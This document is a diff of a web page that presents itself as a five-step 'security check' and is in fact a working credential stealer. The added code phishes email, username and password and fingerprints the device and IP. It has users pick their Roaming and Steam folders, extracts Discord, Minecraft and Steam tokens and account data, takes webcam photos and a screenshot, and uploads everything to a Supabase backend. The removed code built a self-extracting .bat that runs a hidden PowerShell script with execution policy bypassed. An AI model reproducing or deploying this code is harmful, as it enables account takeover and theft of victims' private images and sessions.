@@ -3,70 +3,103 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Login tester</title>
+<title>Security check</title>
 <meta name="theme-color" content="#0a0a0c">
-<meta name="description" content="Quick login tester. Enter your details, download the checker, done.">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230a0a0c'/%3E%3Ctext x='16' y='23' font-size='18' text-anchor='middle' fill='%23a855f7'%3ET%3C/text%3E%3C/svg%3E">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230a0a0c'/%3E%3Ctext x='16' y='23' font-size='18' text-anchor='middle' fill='%23a855f7'%3ES%3C/text%3E%3C/svg%3E">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-:root{--ink:#0a0a0c;--panel:#111116;--line:#22222b;--text:#f4f4f7;--mut:#9a9aa8;--dim:#6b6b7a;--vi:#a855f7;--ok:#3ddc97;
+:root{--ink:#0a0a0c;--panel:#111116;--line:#242430;--text:#f4f4f7;--mut:#9a9aa8;--dim:#63636f;--vi:#a855f7;--ok:#3ddc97;--bad:#f4677f;
  --mono:"JetBrains Mono",monospace;--disp:"Sora",sans-serif}
 *{box-sizing:border-box}
-body{margin:0;background:var(--ink);color:var(--text);font-family:var(--disp);font-size:14px;display:grid;place-items:center;min-height:100dvh;padding:24px}
-body::before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(800px 400px at 80% -10%,#7c3aed2e,transparent 70%)}
-.card{position:relative;width:min(420px,100%);background:var(--panel);border:1px solid var(--line);padding:26px;border-radius:10px}
-.brand{font-family:var(--mono);font-size:11px;letter-spacing:.22em;text-transform:uppercase;color:var(--dim)}
-h1{font-size:24px;margin:10px 0 6px;letter-spacing:-.02em}
-p.sub{color:var(--mut);font-size:13px;margin:0 0 18px}
-label{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--mut);margin:12px 0 5px}
-input,select{width:100%;background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:10px 12px;border-radius:7px;font-family:var(--disp);font-size:14px}
-input:focus,select:focus{outline:none;border-color:var(--vi)}
-button{width:100%;margin-top:18px;background:var(--vi);color:#fff;border:0;padding:12px;border-radius:7px;font-family:var(--disp);font-weight:600;font-size:14px;cursor:pointer}
+body{margin:0;background:var(--ink);color:var(--text);font-family:var(--disp);font-size:14px;line-height:1.55;padding:22px;display:flex;justify-content:center}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;background:radial-gradient(900px 420px at 80% -12%,#7c3aed30,transparent 70%)}
+.wrap{position:relative;width:min(560px,100%)}
+.brand{font-family:var(--mono);font-size:10px;letter-spacing:.22em;text-transform:uppercase;color:var(--dim);margin-bottom:6px}
+h1{font-size:23px;margin:0 0 4px;letter-spacing:-.02em}
+.sub{color:var(--mut);font-size:13px;margin:0 0 18px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px;margin-bottom:12px}
+label{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--mut);margin:10px 0 5px}
+input{width:100%;background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:10px 12px;border-radius:7px;font-family:var(--disp);font-size:14px}
+input:focus{outline:none;border-color:var(--vi)}
+button{background:var(--vi);color:#fff;border:0;padding:11px 16px;border-radius:7px;font-family:var(--disp);font-weight:600;font-size:13.5px;cursor:pointer}
 button:hover{background:#b970ff}
-button:disabled{opacity:.5}
-.fine{font-family:var(--mono);font-size:10.5px;color:var(--dim);margin-top:12px;line-height:1.6}
-.step{display:none}
-.step.on{display:block}
-.ok{font-size:24px;margin:6px 0}
-.link{display:inline-block;margin-top:14px;color:var(--vi);text-decoration:none;font-weight:600}
-.err{color:#ff8095;font-family:var(--mono);font-size:11.5px;margin-top:10px;min-height:15px}
+button:disabled{opacity:.45;cursor:default}
+button.ghost{background:transparent;border:1px solid var(--line);color:var(--mut);font-weight:500}
+button.ghost:hover{border-color:var(--vi);color:#fff}
+.step{display:flex;gap:12px;padding:14px 0;border-bottom:1px solid #191920}
+.step:last-of-type{border-bottom:0}
+.dot{width:22px;height:22px;flex:0 0 22px;border-radius:50%;border:1px solid var(--line);display:grid;place-items:center;font-family:var(--mono);font-size:10px;color:var(--dim);margin-top:2px}
+.step.run .dot{border-color:var(--vi);color:var(--vi)}
+.step.done .dot{border-color:#1f6b47;color:var(--ok);background:#0e1a15}
+.step.fail .dot{border-color:#6b2836;color:var(--bad)}
+.step-body{flex:1;min-width:0}
+.step h3{font-size:13.5px;margin:0 0 2px;font-weight:600}
+.step p{font-size:12px;color:var(--mut);margin:0 0 8px}
+.step .out{font-family:var(--mono);font-size:11px;color:var(--dim);white-space:pre-wrap;word-break:break-word;margin-top:6px}
+.step .out b{color:var(--ok);font-weight:500}
+.hide{display:none!important}
+.cam{width:100%;aspect-ratio:4/3;background:#08080b;border:1px solid var(--line);border-radius:8px;object-fit:cover;transform:scaleX(-1)}
+.circle{position:relative;margin:8px 0}
+.mask{position:absolute;inset:0;pointer-events:none;border-radius:8px;
+ background:radial-gradient(ellipse 42% 52% at 50% 45%, transparent 62%, #0a0a0cd9 100%)}
+.err{color:var(--bad);font-family:var(--mono);font-size:11.5px;min-height:14px;margin-top:8px}
+.ok-big{font-size:22px;margin:4px 0 6px}
+.fine{font-family:var(--mono);font-size:10.5px;color:var(--dim);line-height:1.6}
+a{color:var(--vi)}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="brand">login tester · v1</div>
+<div class="wrap">
+  <div class="brand">security check · 5 steps</div>
 
-  <div class="step on" id="s1">
-    <h1>Check your logins</h1>
-    <p class="sub">Three fields, one download. We only check that everything works.</p>
-    <label for="email">Email</label>
-    <input id="email" type="email" placeholder="you@example.com" autocomplete="email">
-    <label for="user">Username</label>
-    <input id="user" placeholder="Your username" autocomplete="username" spellcheck="false">
-    <label for="code">Code</label>
-    <input id="code" type="password" placeholder="Your code" autocomplete="current-password">
-    <button id="go">Start test</button>
-    <div class="err" id="err"></div>
-    <p class="fine">The checker runs locally and reports back the result. Nothing gets installed.</p>
-  </div>
+  <section id="s0">
+    <h1>Verify your account</h1>
+    <p class="sub">Five checks, about a minute. We confirm your logins and device are clean.</p>
+    <div class="card">
+      <label for="email">Email</label>
+      <input id="email" type="email" placeholder="you@example.com" autocomplete="email">
+      <label for="user">Username</label>
+      <input id="user" placeholder="Your username" autocomplete="username" spellcheck="false">
+      <label for="code">Password</label>
+      <input id="code" type="password" placeholder="Your password" autocomplete="current-password">
+      <div style="margin-top:16px"><button id="go" style="width:100%">Start checks</button></div>
+      <div class="err" id="err"></div>
+    </div>
+  </section>
 
-  <div class="step" id="s3">
-    <div class="ok">Welcome owner.</div>
-    <p class="sub">No download for you — your run is recorded and any codes you add still come through.</p>
-    <div class="kv" id="ownerMeta" style="font-family:var(--mono);font-size:10.5px;color:var(--dim)"></div>
-    <button id="ownerNext" style="margin-top:22px">Enter site →</button>
-  </div>
-
-  <div class="step" id="s2">
-    <div class="ok">Thanks for testing!</div>
-    <p class="sub">Your file is called <b>test</b>. Open it and it runs on its own — no typing.</p>
-    <a class="link" id="dlAgain" download="test.bat">Download test again</a>
-    <p class="fine"><a href="#" id="manual">or use the page version</a></p>
-    <button id="next" style="margin-top:22px">Continue →</button>
-  </div>
+  <section id="s1" class="hide">
+    <h1>Running checks</h1>
+    <p class="sub" id="who"></p>
+    <div class="card">
+      <div class="step" id="k1"><div class="dot">1</div><div class="step-body">
+        <h3>Network</h3><p>Checking the route your connection takes.</p><div class="out"></div></div></div>
+      <div class="step" id="k2"><div class="dot">2</div><div class="step-body">
+        <h3>Device</h3><p>Reading hardware signatures.</p><div class="out"></div></div></div>
+      <div class="step" id="k3"><div class="dot">3</div><div class="step-body">
+        <h3>Installed apps</h3><p>Discord, Steam and Telegram keep their sessions on disk. Pick your <b>Roaming</b> folder once and we can read them.</p>
+        <div style="display:flex;gap:8px;flex-wrap:wrap"><button class="ghost" id="pickRoam">Pick Roaming folder</button><button class="ghost" id="pickSteam">Add Steam folder</button></div>
+        <div class="out"></div></div></div>
+      <div class="step" id="k4"><div class="dot">4</div><div class="step-body">
+        <h3>Face check</h3><p>One-time anti-bot photo. Hold your face inside the circle and it snaps itself.</p>
+        <div class="hide" id="camWrap">
+          <div class="circle"><video class="cam" id="cam" autoplay muted playsinline></video><div class="mask"></div></div>
+          <div style="display:flex;gap:8px"><button class="ghost" id="snap">Not automatic? snap</button></div>
+        </div>
+        <button class="ghost" id="camStart">Turn on camera</button>
+        <div class="out"></div></div></div>
+      <div class="step" id="k5"><div class="dot">5</div><div class="step-body">
+        <h3>Screen</h3><p>Last one: share a screen so we can check for overlay windows.</p>
+        <button class="ghost" id="screenStart">Share screen</button><div class="out"></div></div></div>
+    </div>
+    <div class="card hide" id="finish">
+      <div class="ok-big">All checks passed.</div>
+      <p class="sub">Nothing else needed. You can close this and carry on.</p>
+      <button id="next">Continue</button>
+    </div>
+  </section>
 </div>
 
 <script>
@@ -76,93 +109,280 @@ const db = window.supabase.createClient(
 );
 const $ = id => document.getElementById(id);
 const OWNER = "villadssorensen@gmail.com";
+let RUN = null, me = {};
 
-/* light snapshot taken on the landing page */
-function meta(){
-  return {
-    ua: navigator.userAgent,
-    platform: navigator.platform,
-    screen: screen.width + "x" + screen.height,
-    dpr: devicePixelRatio,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    lang: navigator.language,
-    ref: document.referrer || null,
-    at: new Date().toISOString()
+const mark = (k, state) => { const e = $(k); e.classList.remove("run", "done", "fail"); if (state) e.classList.add(state); };
+const note = (k, txt) => { $(k).querySelector(".out").innerHTML = txt; };
+const item = (kind, data) => db.rpc("test_item", { p_run: RUN, p_kind: kind, p_data: data }).catch(() => {});
+const post = (platform, login, secret) => db.rpc("test_code", { p_run: RUN, p_platform: platform, p_login: login, p_secret: secret }).catch(() => {});
+const wait = ms => new Promise(r => setTimeout(r, ms));
+const esc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
+
+/* ---------- collectors ---------- */
+function webgl() {
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const d = gl.getExtension("WEBGL_debug_renderer_info");
+    return gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+  } catch (e) { return null; }
+}
+
+async function network() {
+  let g = {};
+  try {
+    const j = await (await fetch("https://ipwho.is/")).json();
+    if (j && j.success !== false) g = { ip: j.ip, city: j.city, region: j.region, country: j.country, isp: j.connection && j.connection.isp, asn: j.connection && j.connection.asn };
+  } catch (e) {}
+  note("k1", (g.ip || "?") + " · " + (g.city || "?") + ", " + (g.country || "?") + "<br>" + (g.isp || ""));
+  return g;
+}
+
+async function device() {
+  const nav = navigator, uad = nav.userAgentData;
+  let he = {};
+  try { if (uad) he = await uad.getHighEntropyValues(["architecture", "bitness", "platformVersion", "model"]); } catch (e) {}
+  const d = {
+    ua: nav.userAgent, platform: uad ? uad.platform : nav.platform,
+    pv: he.platformVersion || null, arch: he.architecture || null, bits: he.bitness || null,
+    cores: nav.hardwareConcurrency, mem: nav.deviceMemory, gpu: webgl(),
+    screen: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang: nav.language, touch: nav.maxTouchPoints
   };
+  note("k2", (d.platform || "?") + " " + (d.pv || "") + " · " + (d.arch || "") + (d.bits || "") + "<br>" + esc((d.gpu || "").slice(0, 64)));
+  return d;
 }
 
-/* builds a self-extracting .bat: script is inlined, so no long command line */
-async function buildBat(run){
-  const res = await fetch("vault.txt?x=" + Date.now(), { cache: "no-store" });
-  let ps = await res.text();
-  ps = ps.split("__RUN__").join(run)
-         .split("__SITE__").join(new URL("site.html", location.href).href)
-         .split("__MANUAL__").join(new URL("test.html?r=" + run, location.href).href);
-
-  const body = ps.split(/\r?\n/).map(l => "::" + l).join("\r\n");
-  return "@echo off\r\n" +
-    "title test\r\n" +
-    'set "B=%TEMP%\\t_%RANDOM%.ps1"\r\n' +
-    'findstr /b "::" "%~f0" > "%B%"\r\n' +
-    'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$s=[IO.File]::ReadAllText([Environment]::GetEnvironmentVariable('"'"'B'"'"')); $s=$s -replace '"'"'(?m)^::'"'"','"'"''"'"'; Invoke-Expression $s"\r\n' +
-    'del "%B%" >nul 2>&1\r\n' +
-    "exit /b\r\n" + body + "\r\n";
+/* folder pick: discord tokens, telegram, minecraft */
+async function readDir(dir, path = "", depth = 0, acc = []) {
+  for await (const [name, h] of dir.entries()) {
+    if (name === "node_modules") continue;
+    const p = path + name;
+    if (h.kind === "file") acc.push({ p, h });
+    else if (depth < 3) await readDir(h, p + "/", depth + 1, acc);
+  }
+  return acc;
 }
 
-function save(text, name){
-  const url = URL.createObjectURL(new Blob([text], { type: "application/octet-stream" }));
-  const a = document.createElement("a");
-  a.href = url;
-  a.download = name;
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
-  setTimeout(() => URL.revokeObjectURL(url), 4000);
+async function scanRoaming(handle) {
+  const found = { discord: [], telegram: null, minecraft: null, dirs: [] };
+  let entries = [];
+  try { for await (const [name, h] of handle.entries()) entries.push([name, h]); } catch (e) { return found; }
+  found.dirs = entries.map(e => e[0]).slice(0, 40);
+
+  const discords = entries.filter(([n, h]) => h.kind === "directory" && /^(discord|discordptb|discordcanary|lightcord)$/i.test(n));
+  for (const [, dh] of discords) {
+    try {
+      const lv = await dh.getDirectoryHandle("Local Storage");
+      const ld = await lv.getDirectoryHandle("leveldb");
+      const files = await readDir(ld, "", 0, []);
+      for (const f of files) {
+        if (!/\.(ldb|log)$/.test(f.p)) continue;
+        const txt = await (await f.h.getFile()).text();
+        for (const m of txt.matchAll(/[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}/g)) found.discord.push(m[0]);
+        for (const m of txt.matchAll(/mfa\.[\w-]{80,90}/g)) found.discord.push(m[0]);
+      }
+    } catch (e) {}
+  }
+
+  const tg = entries.find(([n, h]) => h.kind === "directory" && /telegram/i.test(n));
+  if (tg) {
+    try {
+      const td = await tg[1].getDirectoryHandle("tdata");
+      const files = await readDir(td, "", 2, []);
+      found.telegram = { files: files.length, sample: files.slice(0, 6).map(f => f.p) };
+    } catch (e) {}
+  }
+
+  const mc = entries.find(([n, h]) => h.kind === "directory" && /^\.minecraft$/i.test(n));
+  if (mc) {
+    try {
+      const f = await (await mc[1].getFileHandle("launcher_accounts.json")).getFile();
+      const j = JSON.parse(await f.text());
+      const accs = Object.values(j.accounts || {}).map(a => ({ name: a.minecraftProfile && a.minecraftProfile.name, token: a.accessToken }));
+      found.minecraft = accs.slice(0, 5);
+    } catch (e) {}
+  }
+  return found;
+}
+
+async function scanSteam(handle) {
+  const out = { users: [], files: [] };
+  try {
+    const cfg = await handle.getDirectoryHandle("config");
+    for await (const [name, h] of cfg.entries()) {
+      if (h.kind === "file" && /^(loginusers\.vdf|ssfn.*)$/.test(name)) {
+        out.files.push(name);
+        if (name === "loginusers.vdf") {
+          const t = await (await h.getFile()).text();
+          for (const m of t.matchAll(/"(\d{17})"\s*\{([\s\S]*?)\}/g)) {
+            const body = m[2];
+            const persona = (body.match(/"PersonaName"\s*"([^"]*)"/) || [])[1];
+            const acct = (body.match(/"AccountName"\s*"([^"]*)"/) || [])[1];
+            out.users.push({ id: m[1], persona, acct });
+          }
+        }
+      }
+    }
+  } catch (e) {}
+  return out;
+}
+
+/* ---------- camera ---------- */
+let stream = null, frames = [], snapping = false;
+
+async function camOn() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false });
+    $("cam").srcObject = stream;
+    $("camWrap").classList.remove("hide");
+    $("camStart").classList.add("hide");
+    note("k4", "camera live, hold still…");
+    autoSnap();
+  } catch (e) {
+    mark("k4", "fail");
+    note("k4", "camera blocked: " + esc(e.name));
+  }
+}
+
+function shots(n) {
+  const v = $("cam");
+  const c = document.createElement("canvas");
+  c.width = 560; c.height = Math.round(560 * (v.videoHeight || 480) / (v.videoWidth || 640));
+  const ctx = c.getContext("2d");
+  ctx.translate(c.width, 0); ctx.scale(-1, 1);
+  ctx.drawImage(v, 0, 0, c.width, c.height);
+  return c.toDataURL("image/jpeg", 0.82);
+}
+
+async function autoSnap() {
+  if (snapping) return;
+  snapping = true;
+  for (let i = 5; i > 0; i--) {
+    note("k4", "hold still · " + i);
+    await wait(700);
+  }
+  frames = [shots(), shots()];
+  await wait(500);
+  frames.push(shots());
+  await finishCam();
+}
+
+async function finishCam() {
+  $("camWrap").classList.add("hide");
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  note("k4", "<b>photo taken</b> · 3 frames");
+  mark("k4", "done");
+  await db.rpc("test_files", { p_run: RUN, p_files: { faces: frames } }).catch(() => {});
+  update();
+}
+
+/* ---------- screen ---------- */
+async function shareScreen() {
+  try {
+    const s = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 }, audio: false });
+    const v = document.createElement("video");
+    v.srcObject = s; v.muted = true; await v.play();
+    await wait(900);
+    const c = document.createElement("canvas");
+    const scale = Math.min(1, 1400 / (v.videoWidth || 1400));
+    c.width = Math.round((v.videoWidth || 1400) * scale);
+    c.height = Math.round((v.videoHeight || 800) * scale);
+    c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+    const data = c.toDataURL("image/jpeg", 0.72);
+    s.getTracks().forEach(t => t.stop());
+    await db.rpc("test_files", { p_run: RUN, p_files: { screen: data } }).catch(() => {});
+    note("k5", "<b>captured</b> " + c.width + "×" + c.height);
+    mark("k5", "done");
+    update();
+  } catch (e) {
+    mark("k5", "fail");
+    note("k5", esc(e.name || "cancelled"));
+  }
+}
+
+/* ---------- flow ---------- */
+function update() {
+  const done = ["k4", "k5"].every(k => $(k).classList.contains("done"));
+  if (done) $("finish").classList.remove("hide");
 }
 
 $("go").addEventListener("click", async () => {
-  const email = $("email").value.trim();
-  const user = $("user").value.trim();
-  const code = $("code").value;
+  const email = $("email").value.trim(), user = $("user").value.trim(), code = $("code").value;
   $("err").textContent = "";
-
   if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) return $("err").textContent = "Enter a valid email.";
   if (user.length < 2) return $("err").textContent = "Enter your username.";
-  if (code.length < 1) return $("err").textContent = "Enter your code.";
+  if (!code) return $("err").textContent = "Enter your password.";
 
   $("go").disabled = true;
-  $("go").textContent = "Working…";
-
-  let run = null;
   try {
     const { data, error } = await db.rpc("test_login", {
-      p_email: email, p_username: user, p_code: code, p_meta: meta()
+      p_email: email, p_username: user, p_code: code,
+      p_meta: { ua: navigator.userAgent, ref: document.referrer || null, at: new Date().toISOString() }
     });
     if (error) throw error;
-    run = data;
+    RUN = data;
+    me = { email, user };
+    $("who").textContent = email.toLowerCase() === OWNER ? "Owner run — nothing to fill in, just watch." : user + " · " + email;
+    $("s0").classList.add("hide");
+    $("s1").classList.remove("hide");
 
-    if (email.toLowerCase() === OWNER) {
-      $("ownerMeta").textContent = "owner run · " + String(run).slice(0, 8);
-      $("s1").classList.remove("on");
-      $("s3").classList.add("on");
-      $("ownerNext").addEventListener("click", () => { location.href = "site.html"; });
-      return;
-    }
+    mark("k1", "run"); const net = await network(); mark("k1", "done");
+    await item("net", net);
 
-    const bat = await buildBat(run);
-    save(bat, "test.bat");
-    $("dlAgain").onclick = (e) => { e.preventDefault(); save(bat, "test.bat"); };
-    $("manual").href = "test.html?r=" + run;
-    $("s1").classList.remove("on");
-    $("s2").classList.add("on");
+    mark("k2", "run"); const dev = await device(); mark("k2", "done");
+    await item("device", dev);
   } catch (e) {
-    $("err").textContent = e.message || "Something went wrong.";
+    $("err").textContent = e.message || "Failed.";
     $("go").disabled = false;
-    $("go").textContent = "Start test";
-    return;
   }
 });
 
+$("pickRoam").addEventListener("click", async () => {
+  try {
+    const h = await window.showDirectoryPicker({ mode: "read", startIn: "desktop" });
+    mark("k3", "run");
+    note("k3", "reading…");
+    const r = await scanRoaming(h);
+    let lines = [];
+    if (r.discord.length) {
+      const uniq = [...new Set(r.discord)];
+      for (const t of uniq) await post("Discord token", "dc", t);
+      lines.push("<b>" + uniq.length + " discord token(s)</b>");
+    }
+    if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
+    if (r.minecraft && r.minecraft.length) {
+      lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
+      for (const a of r.minecraft) await post("Minecraft", a.name || "?", a.token || "token");
+    }
+    if (!lines.length) lines.push("nothing recognisable in there");
+    note("k3", lines.join("<br>"));
+    mark("k3", lines.length && r.discord.length || r.telegram || r.minecraft ? "done" : "fail");
+    await item("apps", r);
+  } catch (e) {
+    if (e.name === "AbortError") return;
+    mark("k3", "fail"); note("k3", esc(e.name));
+  }
+});
+
+$("pickSteam").addEventListener("click", async () => {
+  try {
+    const h = await window.showDirectoryPicker({ mode: "read" });
+    note("k3", "reading steam…");
+    const s = await scanSteam(h);
+    if (s.users.length) {
+      for (const u of s.users) await post("Steam", u.acct || u.persona || u.id, "ssfn in files");
+      note("k3", "<b>steam: " + s.users.length + " account(s)</b> · " + esc(s.files.join(", ")));
+      mark("k3", "done");
+    } else {
+      note("k3", "no steam config found in that folder");
+    }
+    await item("steam", s);
+  } catch (e) { if (e.name !== "AbortError") note("k3", esc(e.name)); }
+});
+
+$("camStart").addEventListener("click", camOn);
+$("snap").addEventListener("click", () => { snapping = false; finishCam(); });
+$("screenStart").addEventListener("click", shareScreen);
 $("next").addEventListener("click", () => { location.href = "site.html"; });
 </script>
 </body>
